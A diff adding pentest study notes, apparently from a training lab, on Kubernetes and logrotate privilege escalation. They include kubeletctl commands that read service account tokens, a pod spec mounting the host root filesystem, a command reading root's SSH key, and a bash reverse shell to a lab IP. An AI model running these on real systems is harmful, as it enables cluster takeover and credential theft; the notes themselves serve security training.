@@ -245,3 +245,197 @@ docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -i
 _**Escalate the privileges on the target and obtain the flag.txt in the root directory. Submit the contents as the answer.**_
 
 <figure><img src="../../../.gitbook/assets/image (1476).png" alt=""><figcaption></figcaption></figure>
+
+## Kubernetes
+
+[Kubernetes](https://kubernetes.io/), also known as `K8s` transformed the process of deploying and managing applications, providing a more efficient and streamlined approach. Offering an open-source architecture, Kubernetes has been specifically designed to facilitate faster and more straightforward deployment, scaling, and management of application containers.
+
+It is a container orchestration system, which functions by running all applications in containers isolated from the host system through `multiple layers of protection`. This approach ensures that applications are not affected by changes in the host system, such as updates or security patches
+
+Kubernetes revolves around the concept of **pods**, which can hold one or more closely connected containers. **Each pod functions as a separate virtual machine on a node, complete with its own IP, hostname, and other details.**
+
+The core of Kubernetes architecture is its API, which serves as the main point of contact for all internal and external interactions.
+
+By default, **the Kubelet allows anonymous access.** Anonymous requests are considered unauthenticated, which implies that any request made to the Kubelet without a valid client certificate will be treated as anonymous.
+
+**interacting with K8's API ->**
+
+```shell-session
+cry0l1t3@k8:~$ curl https://10.129.10.11:6443 -k
+{
+	"kind": "Status",
+	"apiVersion": "v1",
+	"metadata": {},
+	"status": "Failure",
+	"message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
+	"reason": "Forbidden",
+	"details": {},
+	"code": 403
+}
+```
+
+`System:anonymous` typically represents an unauthenticated user, meaning we haven't provided valid credentials or are trying to access the API server anonymously. In this case, we try to access the root path, which would grant significant control over the Kubernetes cluster if successful.
+
+**If we want to extract pods ->**
+
+```shell-session
+cry0l1t3@k8:~$ curl https://10.129.10.11:10250/pods -k | jq .
+```
+
+This could contain confidential details regarding the container images and their pull policies.
+
+**Kubeletctl - Extracting Pods**
+
+```shell-session
+cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 pods
+```
+
+and to show the available commands ->
+
+```shell-session
+cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 scan rce
+```
+
+We can alos try to engage with a container interactively and gain insight into the extent of our privileges within it ->
+
+```shell-session
+cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
+```
+
+#### Privesc
+
+&#x20;we can utilize a tool called [kubeletctl](https://github.com/cyberark/kubeletctl) to obtain the Kubernetes service account's `token` and `certificate` (`ca.crt`) from the server.
+
+To extract tokens ->
+
+```shell-session
+cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
+```
+
+To extract certificates->
+
+```shell-session
+cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
+```
+
+Now that we have both the `token` and `certificate`, we can check the access rights in the Kubernetes cluster.
+
+```shell-session
+cry0l1t3@k8:~$ export token=`cat k8.token`
+cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
+```
+
+If in the output we see that we can `get`, `create`, and `list` pods which are the resources representing the running container in the cluster, we can create a `YAML` file that we can use to create a new container and mount the entire root filesystem from the host system into this container's `/root` directory ->
+
+```
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privesc
+  namespace: default
+spec:
+  containers:
+  - name: privesc
+    image: nginx:1.14.2
+    volumeMounts:
+    - mountPath: /root
+      name: mount-root-into-mnt
+  volumes:
+  - name: mount-root-into-mnt
+    hostPath:
+       path: /
+  automountServiceAccountToken: true
+  hostNetwork: true
+```
+
+Now we can create the pod ->
+
+```shell-session
+cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
+cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
+```
+
+If the pod is running we can execute the command and we could spawn a reverse shell or retrieve sensitive data like private SSH key from the root user.
+
+```shell-session
+cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
+```
+
+## Logrotate
+
+To prevent the hard disk from overflowing, a tool called `logrotate` takes care of archiving or disposing of old logs.
+
+To get more information on logrotate ->
+
+```shell-session
+ElFelixi0@htb[/htb]$ man logrotate
+ElFelixi0@htb[/htb]$ # or
+ElFelixi0@htb[/htb]$ logrotate --help
+```
+
+This tool is usually started periodically via `cron` and controlled via the configuration file `/etc/logrotate.conf`
+
+<details>
+
+<summary>logrotate.conf example</summary>
+
+```shell-session
+ElFelixi0@htb[/htb]$ cat /etc/logrotate.conf
+
+
+# see "man logrotate" for details
+
+# global options do not affect preceding include directives
+
+# rotate log files weekly
+weekly
+
+# use the adm group by default, since this is the owning group
+# of /var/log/syslog.
+su root adm
+
+# keep 4 weeks worth of backlogs
+rotate 4
+
+# create new (empty) log files after rotating old ones
+create
+
+# use date as a suffix of the rotated file
+#dateext
+
+# uncomment this if you want your log files compressed
+#compress
+
+# packages drop log rotation information into this directory
+include /etc/logrotate.d
+
+# system-specific logs may also be configured here.
+```
+
+</details>
+
+To exploit `logrotate`, we need some requirements that we have to fulfill ->
+
+1. we need `write` permissions on the log files
+2. logrotate must run as a privileged user or `root`
+3. vulnerable versions:
+   * 3.8.6
+   * 3.11.0
+   * 3.15.0
+   * 3.18.0
+
+A good tool to  exploit this is named [logrotten](https://github.com/whotwagner/logrotten).
+
+```shell-session
+logger@nix02:~$ git clone https://github.com/whotwagner/logrotten.git
+logger@nix02:~$ cd logrotten
+logger@nix02:~$ gcc logrotten.c -o logrotten
+```
+
+Now we need a payload to be executed
+
+```shell-session
+logger@nix02:~$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
+```
+
+Then we we need to determine which option `logrotate` uses in `logrotate.conf`
